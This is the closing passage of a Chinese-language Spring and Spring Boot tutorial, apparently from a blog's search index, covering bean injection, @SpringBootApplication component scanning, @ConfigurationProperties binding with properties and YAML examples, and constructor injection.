&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>在使用配置类声明 Bean 时，如果需要传入参数，Spring 会根据类型（byType）自动进行注入。如果存在多个实现，它会选择标记为主要候选者的 Bean。例如，下面的示例会自动注入 <code>AuthenticationConfiguration</code> 类型的 Bean：</li></ol></blockquote><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-function">AuthenticationManager <span class="hljs-title">authenticationManager</span><span class="hljs-params">(AuthenticationConfiguration configuration)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">return</span> configuration.<span class="hljs-title">getAuthenticationManager</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="1-4-4-3、组件类中注入这些-Bean-对象"><a href="#1-4-4-3、组件类中注入这些-Bean-对象" class="headerlink" title="1.4.4.3、组件类中注入这些 Bean 对象"></a>1.4.4.3、组件类中注入这些 Bean 对象</h6><p>在组件类中可通过 <code>@Autowired</code>、<code>@Resource</code> 或 <code>@Qualifier</code> 注解自动装配这些 Bean，实现依赖注入。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">AuthenticationManager</span> authenticationManager; <span class="hljs-comment">// 无需再次传参</span><br>    <br><span class="hljs-comment">// 使用注入的 Bean 进行操作</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">authenticateUser</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;AuthenticationManager injected: &quot;</span> + authenticationManager);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="2、Boot-简化开发"><a href="#2、Boot-简化开发" class="headerlink" title="2、Boot 简化开发"></a>2、Boot 简化开发</h3><h4 id="2-1、自动扫描-Bean-类"><a href="#2-1、自动扫描-Bean-类" class="headerlink" title="2.1、自动扫描 Bean 类"></a>2.1、自动扫描 Bean 类</h4><p>在 <code>src/main/java/com/example</code> 目录下创建一个名为 <code>Application</code> 的主类，并为其添加 <code>@SpringBootApplication</code> 注解。这个注解标识该类为 Spring Boot 应用的入口点，同时它还会自动扫描当前包及其子包中的组件，无需在配置文件中手动配置扫描路径。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* <span class="hljs-doctag">@SpringBootApplication</span> 是组合注解，包含</span><br><span class="hljs-comment">*    1. <span class="hljs-doctag">@SpringBootConfigutation</span>：标识为配置类</span><br><span class="hljs-comment">*    2. <span class="hljs-doctag">@EnableAutoConfiguration</span>：启用自动配置</span><br><span class="hljs-comment">*    3. <span class="hljs-doctag">@ComponentScan</span>：扫描当前包及子包的组件</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringBootDemoApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">SpringBootDemoApplication</span>.<span class="hljs-property">class</span>, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-2、属性绑定"><a href="#2-2、属性绑定" class="headerlink" title="2.2、属性绑定"></a>2.2、属性绑定</h4><p>在 Spring Boot 中，无需在不同文件中重复使用 <code>@Value</code> 进行注入。Spring Boot 提供了属性绑定功能，可以将配置文件（<code>application.properties</code> 或 <code>application.yaml</code>）中的属性值一键绑定到组件类的属性上，从而简化了配置和注入过程，提高了开发效率。</p><p>&#x3D;&#x3D;1.组件类&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Component</span>    <span class="hljs-comment">// 注入类声明为组件是必须的</span><br><span class="hljs-meta">@ConfigurationProperties</span>(prefix = <span class="hljs-string">&quot;app&quot;</span>)    <span class="hljs-comment">// Boot 属性绑定</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppProperties</span> &#123;<br><span class="hljs-comment">// 简单类型</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;  <span class="hljs-comment">// 简单类型</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> emptyString;  <span class="hljs-comment">// 空字符串</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> nullValue;  <span class="hljs-comment">// null 值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> specialChar;  <span class="hljs-comment">// 特殊字符</span><br><br><span class="hljs-comment">// 简单数组 </span><br><span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span>[] names;  <span class="hljs-comment">// 一维数组</span><br><span class="hljs-keyword">private</span> int[][] coordinates;  <span class="hljs-comment">// 二维数组</span><br><br><span class="hljs-comment">// 简单 List 集合</span><br><span class="hljs-keyword">private</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; users;<br><br><span class="hljs-comment">// 简单 Set 集合</span><br><span class="hljs-keyword">private</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">String</span>&gt; roles;<br><br><span class="hljs-comment">// 简单 Map 集合</span><br><span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;&gt; mapp<br>&#125; <br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.配置文件：application.properties&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 简单类型</span><br>app.<span class="hljs-attribute">name</span>=MyApplication<br><br><span class="hljs-comment"># 空字符串</span><br>app.emptyString=<br><br><span class="hljs-comment"># null 值</span><br>app.<span class="hljs-attribute">nullValue</span>=<span class="hljs-literal">null</span><br><br><span class="hljs-comment"># 特殊字符(直接写特殊字符就好)</span><br>app.<span class="hljs-attribute">specialChar</span>=2&lt;3<br><br><span class="hljs-comment"># 一维数组</span><br>app.<span class="hljs-attribute">names</span>=Alice,Bob,Charlie<br><br><span class="hljs-comment"># 二维数组</span><br>app.<span class="hljs-attribute">coordinates</span>=1,2;3,4;5,6<br><br><span class="hljs-comment"># 简单 List 集合</span><br>app.<span class="hljs-attribute">users</span>=Alice,Bob,Charlie<br><br><span class="hljs-comment"># 简单 Set 集合</span><br>app.<span class="hljs-attribute">roles</span>=admin,user,guest<br><br><span class="hljs-comment"># 简单 Map 集合</span><br>app.mapp.<span class="hljs-attribute">users</span>=Alice,Bob,Charlie   #<span class="hljs-built_in"> users </span>是键，后面的是值<br>app.mapp.<span class="hljs-attribute">roles</span>=admin,user,guest    # roles 是键，后面的是值<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.配置文件：application.yml&#x3D;&#x3D;</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">MyApplication           # 简单类型</span><br>  <span class="hljs-attribute">emptyString</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;               # 空字符串</span><br>  <span class="hljs-attribute">nullValue</span><span class="hljs-punctuation">:</span> <span class="hljs-string">null               # null 值</span><br>  <span class="hljs-attribute">specialChar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2&lt;3&quot;            # 特殊字符，建议使用引号</span><br><br>  <span class="hljs-attribute">names</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                       # 一维数组</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Alice</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Bob</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Charlie</span><br><br>  <span class="hljs-attribute">coordinates</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                 # 二维数组</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">- 1</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">2</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">- 3</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">4</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">- 5</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">6</span><br><br>  <span class="hljs-attribute">users</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                       # 简单 List 集合</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Alice</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Bob</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Charlie</span><br><br>  <span class="hljs-attribute">roles</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                       # 简单 Set 集合</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">user</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">guest</span><br><br>  <span class="hljs-attribute">settings</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                    # 简单 Map 集合，值为 List</span><br>    <span class="hljs-attribute">users</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                     # 键：users，值为数组</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Alice</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Bob</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Charlie</span><br>    <span class="hljs-attribute">roles</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                     # 键：roles，值为数组</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">user</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">guest</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-3、唯一构造机制"><a href="#2-3、唯一构造机制" class="headerlink" title="2.3、唯一构造机制"></a>2.3、唯一构造机制</h4><p>在 Spring Boot 开发中，如果 Bean 类只有一个构造函数，则无需额外使用 <code>@Autowired</code> 等注解，Spring Boot 会自动根据构造函数中的参数类型（byType）进行装配：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyService</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MyRepository myRepository;<br><br>    <span class="hljs-comment">// 只有一个构造函数，Spring 会自动根据参数类型注入 MyRepository</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyService</span><span class="hljs-params">(MyRepository myRepository)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.myRepository = myRepository;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">performAction</span><span class="hljs-params">()</span> </span>&#123;<br>        myRepository.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring IOC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
